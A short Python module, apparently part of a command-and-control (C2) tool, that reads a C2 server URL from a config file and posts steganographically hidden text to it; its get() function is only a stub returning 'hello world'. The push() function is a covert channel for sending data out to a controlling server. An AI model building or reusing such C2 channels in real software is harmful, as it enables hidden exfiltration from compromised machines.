import requests
import json

#Import the C2 configuration
with open('./code/conf/c2.conf', 'r') as configFile: c2Config = json.load(configFile)

def get():
    return ("hello world")

def push(stegoText: str):
    c2URL = c2Config["c2URL"]
    requests.post(c2URL, stegoText)
    return True